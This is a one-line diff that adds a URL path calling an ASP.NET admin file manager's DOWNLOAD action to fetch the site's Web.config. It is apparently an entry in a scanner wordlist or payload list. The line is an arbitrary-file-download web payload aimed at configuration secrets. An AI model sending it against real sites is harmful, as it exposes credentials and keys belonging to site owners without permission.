@@ -1,0 +1,1 @@
+/Admin/fileManage.aspx?action=DOWNLOAD&value1=~%2FWeb.config
